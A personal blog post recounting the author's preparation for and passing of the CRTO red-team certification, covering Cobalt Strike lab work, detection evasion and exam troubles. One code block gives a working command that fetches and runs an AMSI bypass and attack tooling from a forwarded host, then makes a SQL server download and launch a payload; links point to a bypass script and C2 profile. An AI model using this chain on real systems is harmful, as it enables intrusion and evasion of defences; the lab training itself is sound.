---
title: the CRTO journey
date: 2024-04-19 13:01:00 +0100
categories: [personal]
tags: [education,hacking,CRTO]     # TAG names should always be lowercase
comments: true
---

# Intro

So I finally did it, I managed the CRTO exam while also feeling that I actually learned something which will stay with me  for some time. This is something which is different for me when comparing to SANS courses where a lot of them are based around memory recognition during the exam, or to have a good enough indexing system of the course material etc.

CRTO (and to some degree I guess I would count OSCP the same) rely so much more on understanding the technical concepts, and then have enough know-how and practical knowledge and how to apply them to tooling.

CRTO as such is a course based on red team emulation, based around the Cobalt Strike platform and some surrounding tools which have a good interoperability such as Sharp-tools, Rubeus, Mimikatz etc. 

The course leads you around the usage and basics of Cobalt Strike:
* how to use it to get a foothold and persistence in a target Windows environment 
* how to steal credential material to impersonate identities of interest
* how to leverage those identities to pwn new machines and identities
....all the way to domain admin or a admin access to a DC.

It's thorough, with some handholding in some places, and not in some other places where it's needed. Altogether, I'd say that it might be seen as introductory (for some) but for me who failed the OSCP 5 years ago and who have only worked with blueteaming activites, the level in this course was just about right. 

The support is good, done via Discord first and foremost, and the developer Daniel is active and supportive. The only gripe I have is that as red activity courses come, they all seem to have problems with the "try harder"-mentality (fucking hate it).

It's not very evident within the CRTO discord but might creep up if the question you pose is shallow, not defined enough or you don't really show what you've tried.

Conversations such as;

- "I've done X, why don't I get Y result?"
- "Why would you get Y result?"

These kinds of conversations irk me, and I don't think I'm the only one although I believe that my exact problems with it are probably not the same as others. Anyway, these are a minimum and most of the time are not an issue, or too much of a deal.

# The prep

So I started the course during summer 2023 and studied intently for a month maybe during office hours with a colleague doing the course at the same time. Some time during autumn, I had gone through some 85% of the course, sadly some parts were unavailable due to me running on an old version of the lab environment.

If you take the course, you need to stay updated on changes in the lab and you need to check if there is a need to update the lab to get access to a new feature or a bug or feature fix. The problem is of course if you let the lab environment update (it's done manually) it reverts and gets fully redeployed, removing all customization and state and progress you've made.

I had a tool missing (couldn't do the tool related modules) and a couple of bugs which needed fixing during my run, so yes, I reverted the lab fully...BUT...I did it after the first run through so I could combine it with turning on Defender in the lab environment. And turning on Defender and have full AMSI protection on the machines in the lab is where the real game is at.

I then started to redo the entire lab environment with all modules with Defender on. There was a lot of background research in the beginning, getting the AMSI patches correct, the malleable C2 profile correct and such things as;

* understanding that you can actually chain an AMSI-bypass via powershell-script
* to be able to load tooling in the beacon via a powershell-script
* to be able to load a powershell payload or file payload.

Case in point would be that you need to load an AMSI-bypass to load PowerupSQL (which AMSI will block), so that you can enable xp_cmdshell and run a payload on a SQL-server like so;

```
powerpick iex (iwr http://rportfwd-host:8080/amsi -usebasicparsing);iex (iwr http://rportfwd-host:8080/powerview -usebasicparsing); Invoke-SQLOSCmd -Instance "db.example.domain,1433" -Command "powershell iwr 'rportfwd-host:8080/smb' -outfile c:\windows\tasks\smb.exe ; start-process c:\windows\tasks\smb.exe"
 ```

My sample [c2 profile](https://raw.githubusercontent.com/kaywoz/redstuff/main/cobaltstrike/webbug.profile) is here and the [AMSI](https://raw.githubusercontent.com/kaywoz/redstuff/main/powershell/amsibypass.ps1) used is straight from the course although I tried some others freely available on Gitbhub etc.

The difficulty level increased to say the least. A lot of the time was spent getting these kinds of things right, a lot of backsearching the discord for how or if a tool works with Defender on, how to change the payload to not get detected etc. 

Safe to say, going through the material again leads you toward the need to modify you own processes in a very natural way.

Finally during spring 2024 and an intense 2 week schedule between work assignments made it possible for me to finalize the labs with Defender enabled and processes for persistence, recon, creds theft, privesc and lateral movement. 

I put in a lot of effort to have "ready to deploy" cmdline samples etc and something of a cheatsheet although you can probably get by with the abundance of cheatsheets for CRTO etc on Github.

# The exam

The exam was scheduled for an early Monday morning, and the main focus during the morning was to build payloads clearing Threatcheck. Even though I've done it so many times during the course, I ran into snags and needed to double and triplecheck what I had actually done.

That I breathed a sigh of relief when I got my first beacon is an understatement. ![stagerbeacon](assets/images/2024-04-20-the-crto-journey/1.png)

But then when the stager downloaded the second payload, and it was detected and blocked and I realised that I'd built something wrong was not a fun feeling. Needing to redo it and troubleshoot was not a great place to be mentally.

The problem more or less layed in me being stressed and overlooking what I was doing, and how and what I was copy-pasting. 

Needless to say, I burned some 6 hours preparing my c2profile, my payloads etc just to get the clean result. ![threatcheck](assets/images/2024-04-20-the-crto-journey/6.png)

The advice would be to relax, breathe, and fall back on your experience and not rush into things.

Well, onwards?

Yes, but not without issues (cue the weirdness). 

The first machine was fairly straight forward (I thought) and the road to privesc was textbook. But it did not work. None of the payloads did. So much more burned time. 

I finally had to resolve to other means and payloads outside of the course to get elevated access. Good thing I have a sysadmin background I guess. (can't be more open about this issue for obvious reasons, I just hope you won't run into it.)

Alright, privesc on machine1, and... the flag was not there... literally. ![missing1](assets/images/2024-04-20-the-crto-journey/3.png)

No, matter. I'll pop a question to the support team and move on. 

I continued to compromise machine2 and... the flag was not there either... ![missing2](assets/images/2024-04-20-the-crto-journey/4.png)

And that was the first 24 hours. It sucked. I sucked and all was burning around me, lol.

Cue some ZZZs and a chug of M0nster later and I had high hopes. 

Daniel (the course developer) had responded to my requests and redeployed the flags to the machines. I could extract them finally and I at least felt like I had made some progress and not just managed hurdles.

Machine3 was easy-ish as long as you knew what the path was, and it was a lot more fun due to how to move laterally from it to Machine4 which I basically compromised without tools (sysadmin experience booyah.) 

I was on a roll. And then machine5 hit me in the face on the way out with a cocktail which looked good but tasted like shit. Getting lowpriv access was fairly easy and fun, but then the obvious way to privesc... just... did... not.. work

Typical "works on my machine"-shenanigans, where the payload starts a listener on my port of choice 6970.
![worksonmymachine](assets/images/2024-04-20-the-crto-journey/2.png)

but not on the target...
![nah](assets/images/2024-04-20-the-crto-journey/7.png)

After a long troubleshooting session I just reconconciled and moved to a different exploit which of course worked in like 5 minutes..gah

Moving to the final machine worked for me and compromising it went smoothly. (I thought)

![done?](assets/images/2024-04-20-the-crto-journey/12.png) 

But machine6 had a final FU.
![fusaysthemachine](assets/images/2024-04-20-the-crto-journey/5.png)

I compromised the DC, had (momentary) access, was not able to jump, was not able to list anything in the filesystem as I lost the access momements later. Like wtf?! All in the span of some 15 seconds.

I redid the whole thing but no, I could not get "long" access to the machine so I simply resorted to the boring way to do it.
![itisiwhosaysfutothemachine](assets/images/2024-04-20-the-crto-journey/8.png) 

But hey, it worked! And I finally had 6 flags and enough for the certificate! 
![done](assets/images/2024-04-20-the-crto-journey/11.png) 

My final console list looked something like this, quite a lot of beacons!
![beacons](assets/images/2024-04-20-the-crto-journey/9.png) 

and the network map looked like this, kinda bouncey right?
![done2](assets/images/2024-04-20-the-crto-journey/10.png) 


# Closing thoughts

Was it fun? Yes.
Was it good? YES.
Was it irritating? YES!
Did I hate my life? Hell YES!!! ;-)

In retrospect, I would recommend the course to any blueteamers who are more inclined to move to purple or red teaming activites for a deeper understanding of what we are doing besides managing SIEMs and building SOAR policies.

It's a deep course, not withough technical issues, but I believe a lot of us would benefit from it and it would make the community better if we had more diverse skills. Thx to Daniel et al for the course.
